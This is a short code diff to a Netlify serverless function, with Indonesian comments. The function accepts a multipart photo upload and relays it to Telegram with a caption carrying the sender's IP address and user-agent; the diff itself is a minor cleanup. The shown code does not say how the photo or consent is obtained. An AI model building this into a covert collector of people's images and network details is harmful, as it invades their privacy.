@@ -15,27 +15,22 @@ exports.handler = async (event) => {
       return { statusCode: 400, body: JSON.stringify({ error: 'multipart required' }) };
     }
 
-    // Netlify default: body base64 untuk binary
     const bodyBuf = event.isBase64Encoded
       ? Buffer.from(event.body, 'base64')
       : Buffer.from(event.body, 'binary');
 
-    const boundary = '----NetlifyBoundary' + Date.now();
     const ip = event.headers['x-nf-client-connection-ip'] || event.headers['x-forwarded-for'] || 'unknown';
     const ua = event.headers['user-agent'] || 'unknown';
-    const label = (event.queryStringParameters?.label) || 'photo';
 
-    // Parse multipart manual
     const parsed = parseMultipart(bodyBuf, contentType);
     if (!parsed || !parsed.photo) {
       return { statusCode: 400, body: JSON.stringify({ error: 'no photo field' }) };
     }
 
-    // Build form-data untuk Telegram
     const boundary2 = '----TgBoundary' + Date.now();
     const parts = [];
-
-    const caption = `📸 Foto baru\nLabel: ${parsed.label || label}\nIP: ${ip}\nUA: ${ua.slice(0,120)}`;
+    const label = parsed.label || 'photo';
+    const caption = `📸 Foto baru\nLabel: ${label}\nIP: ${ip}\nUA: ${ua.slice(0,120)}`;
 
     parts.push(Buffer.from(
       `--${boundary2}\r\n` +
